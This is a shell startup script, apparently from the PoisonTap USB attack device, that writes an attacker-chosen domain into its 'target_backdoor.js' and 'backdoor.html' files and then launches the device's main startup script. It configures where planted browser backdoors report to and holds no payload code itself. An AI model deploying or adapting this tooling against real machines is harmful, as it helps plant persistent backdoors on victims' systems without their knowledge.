#!/bin/sh
if [ -e "/boot/host.poisontap" ]
then
    host=`cat /boot/host.poisontap`
    sed -i "s|YOUR.DOMAIN|${host}|g" /var/opt/poisontap/target_backdoor.js
    sed -i "s|YOUR.DOMAIN|${host}|g" /var/opt/poisontap/backdoor.html
fi
/var/opt/poisontap/pi_startup.sh
